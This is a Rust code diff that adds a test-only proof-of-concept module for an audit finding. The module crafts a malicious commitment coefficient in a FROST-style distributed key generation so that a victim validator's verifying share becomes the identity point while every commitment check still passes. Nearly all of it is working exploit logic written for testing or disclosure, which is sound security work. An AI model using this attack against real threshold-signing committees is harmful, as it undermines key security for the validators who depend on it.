+/// F3-XC-100 PoC helper (temporary): builds the identity-verifying-share attack
+/// vectors for a committee of `addrs` (attacker LAST). The attacker keeps a
+/// valid proof of knowledge of `c[0]` and proof of possession of `q`, and only
+/// rewrites its `c[1]` so that the victim's verifying share sums to the
+/// identity. The crafted commitment still passes `verify_commitment`; the
+/// victim's own `generate_secret_shares` then yields `y = (0, 0)`.
+#[cfg(test)]
+pub(crate) mod identity_attack {
+    use super::{keygen, marshal, participants};
+    use crate::bindings;
+    use alloy::primitives::Address;
+    use std::collections::BTreeMap;
+
+    /// Returns `(victim_secrets, published_commitments, honest_shares,
+    /// victim_verifying_share)`: the victim's secrets, the five published
+    /// commitments (attacker last, `c[1]` crafted), the published secret shares
+    /// of the three honest non-victim/non-attacker participants, and the
+    /// victim's own verifying share (expected to be the identity `(0, 0)`).
+    pub(crate) fn vectors(
+        addrs: &[Address],
+        threshold: u16,
+        victim: Address,
+    ) -> (
+        keygen::Secrets,
+        Vec<(Address, bindings::KeyGenCommitment)>,
+        Vec<(Address, bindings::KeyGenSecretShare)>,
+        bindings::Point,
+    ) {
+        let count = addrs.len() as u16;
+        let attacker = *addrs.last().expect("non-empty committee");
+        let mut rng = rand::thread_rng();
+
+        let mut secrets = BTreeMap::new();
+        let mut commitments = BTreeMap::new();
+        for &a in addrs {
+            let s = keygen::setup(&mut rng, a, count, threshold).unwrap();
+            commitments.insert(a, s.commitment());
+            secrets.insert(a, s);
+        }
+
+        // Force the victim's verifying share Y_v = sum_k eval_k(x_v) to the
+        // identity by choosing the attacker's c[1]:
+        //   Y_v = S0 + x*(S1_others + c1_A) + x^2*S2  = O
+        //   c1_A = -(S0 + x^2*S2)/x - S1_others
+        // with S0 = sum c[0], S2 = sum c[2], S1_others = sum_{k!=A} c[1].
+        let x = participants::identifier(victim).to_scalar();
+        let s0: k256::ProjectivePoint = addrs
+            .iter()
+            .map(|a| marshal::frost_point(&commitments[a].c[0]).unwrap())
+            .sum();
+        let s2: k256::ProjectivePoint = addrs
+            .iter()
+            .map(|a| marshal::frost_point(&commitments[a].c[2]).unwrap())
+            .sum();
+        let s1_others: k256::ProjectivePoint = addrs
+            .iter()
+            .filter(|a| **a != attacker)
+            .map(|a| marshal::frost_point(&commitments[a].c[1]).unwrap())
+            .sum();
+        let c1_attacker = -((s0 + s2 * (x * x)) * x.invert().unwrap()) - s1_others;
+        commitments.get_mut(&attacker).unwrap().c[1] = marshal::solidity_point(&c1_attacker);
+
+        // Every validator verifies the (crafted) commitments; this succeeds.
+        let verified: BTreeMap<_, _> = addrs
+            .iter()
+            .map(|&a| (a, keygen::verify_commitment(a, &commitments[&a]).unwrap()))
+            .collect();
+
+        // The three honest non-victim/non-attacker participants publish their
+        // (valid) secret shares.
+        let mut honest_shares = Vec::new();
+        for &a in addrs {
+            if a == victim || a == attacker {
+                continue;
+            }
+            let (_state, share) =
+                keygen::generate_secret_shares(secrets[&a].clone(), verified.clone()).unwrap();
+            honest_shares.push((a, share));
+        }
+
+        // The victim's own share: its verifying share is the identity.
+        let (_vstate, victim_share) =
+            keygen::generate_secret_shares(secrets[&victim].clone(), verified.clone()).unwrap();
+
+        let published: Vec<_> = addrs
+            .iter()
+            .map(|&a| (a, commitments.remove(&a).unwrap()))
+            .collect();
+
+        (
+            secrets.remove(&victim).unwrap(),
+            published,
+            honest_shares,
+            victim_share.y,
+        )
+    }
+}
